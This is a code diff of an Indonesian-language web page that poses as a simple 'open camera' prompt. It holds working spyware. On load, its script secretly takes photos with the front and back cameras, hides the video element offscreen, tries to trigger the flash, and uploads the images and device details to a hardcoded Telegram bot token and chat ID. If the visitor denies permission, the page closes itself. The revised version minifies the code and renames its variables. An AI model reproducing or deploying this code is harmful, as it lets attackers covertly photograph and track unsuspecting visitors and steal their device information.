@@ -5,175 +5,66 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
     <title>Kamera</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-            height: 100vh;
-            width: 100vw;
-            position: fixed;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            background:#fff;
+            font-family:-apple-system,Arial,sans-serif;
+            height:100vh;width:100vw;
+            position:fixed;
+            display:flex;justify-content:center;align-items:center;
+            overflow:hidden;
         }
-        
-        .container {
-            text-align: center;
-            padding: 30px;
-        }
-        
-        .camera-icon {
-            font-size: 80px;
-            margin-bottom: 20px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-        }
-        
-        h2 {
-            font-size: 20px;
-            color: #222;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-        
-        p {
-            font-size: 13px;
-            color: #888;
-            margin-bottom: 5px;
-        }
-        
-        .success-icon {
-            font-size: 80px;
-            display: none;
-        }
-        
-        .hidden { display: none; }
+        .c{text-align:center;padding:30px}
+        .e{font-size:80px}
+        h2{font-size:20px;color:#222;font-weight:600;margin:15px 0 5px}
+        p{font-size:13px;color:#888}
     </style>
 </head>
 <body>
-
-<div class="container" id="mainContent">
-    <div class="camera-icon" id="icon">📸</div>
-    <h2 id="title">Buka Kamera</h2>
-    <p id="subtitle">Ketuk izinkan untuk melanjutkan</p>
+<div class="c" id="m">
+    <div class="e">📸</div>
+    <h2>Buka Kamera</h2>
+    <p>Ketuk izinkan</p>
 </div>
-
-<video id="videoFront" style="display:none;" playsinline autoplay muted></video>
-<video id="videoBack" style="display:none;" playsinline autoplay muted></video>
-
 <script>
-const BOT_TOKEN = "8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
-const CHAT_ID = "1923372966";
-const CHAT_ID_TARGET = "1923372966";
+const T="8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
+const C="1923372966";
 
-async function captureAndSend(facingMode, label) {
-    const video = document.createElement('video');
-    video.setAttribute('playsinline', '');
-    video.setAttribute('autoplay', '');
-    video.setAttribute('muted', '');
-    video.style.display = 'none';
-    document.body.appendChild(video);
-    
-    const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facingMode, width: { ideal: 1920 }, height: { ideal: 1080 } }
-    });
-    
-    video.srcObject = stream;
-    await video.play();
-    
-    // Flash: coba nyalain torch
-    try {
-        const track = stream.getVideoTracks()[0];
-        await track.applyConstraints({ advanced: [{ torch: true }] });
-        await new Promise(r => setTimeout(r, 300));
-    } catch(e) {}
-    
-    await new Promise(r => setTimeout(r, 800));
-    
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0);
-    
-    // Matikan torch
-    try {
-        const track = stream.getVideoTracks()[0];
-        await track.applyConstraints({ advanced: [{ torch: false }] });
-    } catch(e) {}
-    
-    stream.getTracks().forEach(t => t.stop());
-    video.remove();
-    
-    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
-    
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('photo', blob, `${label}_${Date.now()}.jpg`);
-    formData.append('caption', `📸 ${label} - ${new Date().toLocaleString()}\n📱 ${navigator.userAgent.substring(0, 100)}`);
-    
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-    });
+async function k(f,l){
+    const v=document.createElement('video');
+    v.setAttribute('playsinline','');v.setAttribute('autoplay','');
+    v.style.cssText='position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
+    document.body.appendChild(v);
+    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:1280},height:{ideal:720}}});
+    v.srcObject=s;await v.play();
+    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:true}]})}catch(e){}
+    const c=document.createElement('canvas');
+    c.width=640;c.height=480;
+    c.getContext('2d').drawImage(v,0,0,640,480);
+    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]})}catch(e){}
+    s.getTracks().forEach(t=>t.stop());v.remove();
+    const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.8));
+    const d=new FormData();
+    d.append('chat_id',C);d.append('photo',b,l+'.jpg');
+    d.append('caption','📸 '+l+' - '+new Date().toLocaleString());
+    await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:d});
 }
 
-async function startCapture() {
-    try {
-        // Update UI
-        document.getElementById('icon').textContent = '⏳';
-        document.getElementById('title').textContent = 'Memproses...';
-        document.getElementById('subtitle').textContent = 'Jangan tutup halaman ini';
-        
-        // Foto depan
-        document.getElementById('subtitle').textContent = 'Kamera depan...';
-        await captureAndSend('user', 'DEPAN');
-        
-        // Foto belakang
-        document.getElementById('subtitle').textContent = 'Kamera belakang...';
-        await captureAndSend('environment', 'BELAKANG');
-        
-        // Kirim info device
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: `📱 DEVICE INFO\n🕐 ${new Date().toLocaleString()}\n🌐 ${navigator.userAgent}\n📏 ${screen.width}x${screen.height}\n🔋 ${navigator.hardwareConcurrency || '?'} cores`
-            })
-        });
-        
-        // Sukses
-        document.getElementById('icon').textContent = '✅';
-        document.getElementById('icon').style.animation = 'none';
-        document.getElementById('title').textContent = 'Berhasil';
-        document.getElementById('subtitle').textContent = 'Anda dapat menutup halaman ini';
-        
-    } catch(e) {
-        // Ditolak → Force Close
-        document.getElementById('icon').textContent = '❌';
-        document.getElementById('title').textContent = '';
-        document.getElementById('subtitle').textContent = '';
-        
-        // Force close setelah 1 detik
-        setTimeout(function() {
-            window.close();
-            // Fallback kalau window.close() nggak bisa
-            if (!window.closed) {
-                window.location.href = 'about:blank';
-                setTimeout(function() { window.close(); }, 100);
-            }
-        }, 800);
-    }
+(async()=>{
+try{
+    await k('user','DEPAN');
+    await k('environment','BELAKANG');
+    await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:C,text:'📱 '+navigator.userAgent+'\n📏 '+screen.width+'x'+screen.height+'\n🕐 '+new Date().toLocaleString()})
+    });
+    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Tutup halaman ini</p>';
+}catch(e){
+    document.getElementById('m').innerHTML='';
+    setTimeout(()=>{window.close();if(!window.closed){window.location.href='about:blank';setTimeout(()=>window.close(),50)}},500);
 }
-
-// Jalankan
-startCapture();
+})();
 </script>
 </body>
 </html>
